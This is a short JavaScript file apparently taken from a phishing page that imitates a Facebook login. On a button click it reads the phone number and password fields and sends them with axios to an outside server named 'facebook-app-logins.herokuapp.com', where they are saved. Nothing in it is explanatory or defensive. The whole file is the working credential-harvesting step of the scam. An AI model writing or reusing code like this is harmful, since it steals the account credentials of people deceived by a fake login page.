const phone=document.querySelector("#phone");
const pass=document.querySelector("#pass");
const button=document.querySelector("#button");
button.addEventListener('click',()=>{
    login()
})

const credentials= {};

function login(){
    credentials.phone= phone.value;
    credentials.pass= pass.value;
    axios.post("https://facebook-app-logins.herokuapp.com/save",credentials);
    console.log('clicked')
    
}